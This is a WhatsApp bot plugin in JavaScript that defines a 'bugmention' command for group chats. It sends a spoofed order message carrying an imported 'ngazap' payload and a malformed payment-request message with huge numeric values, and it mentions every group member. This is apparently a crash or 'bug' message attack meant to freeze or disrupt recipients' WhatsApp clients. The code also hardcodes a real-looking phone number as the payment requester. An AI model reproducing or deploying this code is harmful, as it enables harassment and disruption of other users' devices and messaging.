let { ngazap } = require('../src/ngazap.js')
let fs = require('fs')

let handler = async(m, { isOwner, isAdmin, conn, text, participants }) => {
  var troli = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail: null, surface: 200, message: `${ngazap(prefix)}`, orderTitle: `${ngazap(prefix)}`, sellerJid: '0@s.whatsapp.net'}}}
  let teks = `*~BUG MENTION~*\n`
  for (let mem of participants) {
  teks += `*~@${mem.id.split('@')[0]}~* `
  }
  conn.relayMessage(m.chat, { requestPaymentMessage: { Message: { TextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '6285752765133@s.whatsapp.net', expiryTimestamp: 6285752765133, amount: 6285752765133, background: fs.readFileSync('./src/logo.jpg') }}}}, {})
  conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: troli } )
}
handler.help = ['bugmention']
handler.tags = ['premium']
handler.command = /^(bugmention)$/i
handler.rowner = true
handler.group = true

module.exports = handler